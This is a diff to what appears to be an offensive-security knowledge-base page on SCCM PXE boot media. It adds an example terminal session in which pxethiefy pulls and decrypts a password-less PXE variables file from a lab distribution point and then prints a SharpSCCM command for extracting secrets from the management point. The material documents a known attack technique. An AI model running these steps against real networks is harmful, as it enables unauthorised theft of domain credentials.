@@ -56,8 +56,43 @@ With these credentials, attackers may transition from an unauthenticated context
 
 ## Examples
 
+- Using pxethiefy from a Linux machine with network access to retrieve a PXE media file with no password set
 ```
+testsubject4@sphere4:~$ sudo python3 pxethiefy.py explore -i eth0 -a atlas.aperture.local
+ 
+ ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ ___    ___ 
+|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\\  \  /  /|
+\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/\ \  \/  / /
+ \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\\ \    / / 
+  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_| \/  /  /  
+   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\__/  / /    
+    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|\___/ /     
+          |__|/ \|__|                                                     \|___|/      
+                                                                                       v.0.0.2
+                                                Based on the original PXEThief by MWR-CyberSec
+                                                     https://github.com/MWR-CyberSec/PXEThief/
 
+[*] Querying Distribution Point: atlas.aperture.local
+[*] Sending DHCP request to fetch PXE boot files at: atlas.aperture.local
+--- Scapy output ---
+.
+Sent 1 packets.
+[*] Variables File Location: \SMSTemp\2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var
+[*] BCD File Location: \SMSTemp\2023.10.13.16.48.53.07.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.bcd
+[*] Downloading var file '\SMSTemp\2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var' from TFTP server 'atlas.aperture.local'
+[+] Blank password on PXE media file found!
+[*] Attempting to decrypt it...
+[+] Media variables file to decrypt: 2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var
+[+] Password bytes provided: 0xb4ff3000ceff90fffbff4c00ceff89ffdcff4800
+[+] Successfully decrypted media variables file with the provided password!
+[+] Management Point: http://atlas.aperture.local
+[+] Site Code: PS1
+[+] You can use the following information with SharpSCCM in an attempt to obtain secrets from the Management Point..
+  SharpSCCM.exe get secrets -i "{d10d7f98-17dd-4588-b645-34964936023b}" -m "{5F8225E8-6B94-4830-AD90-0F88FC2B3536}" -c "3082073E020103308206FA06092A864886F70D010701A08206EB048206E7308206E33082
+
+<SNIP>
+
+6C458FCF53D0A6D2DBA446F1C0414FAD1E03A89D8481E26D7C1BED1E71FDC3272C701020207D0" -s -c PS1 -mp atlas.aperture.local
 ```
 
 ## References
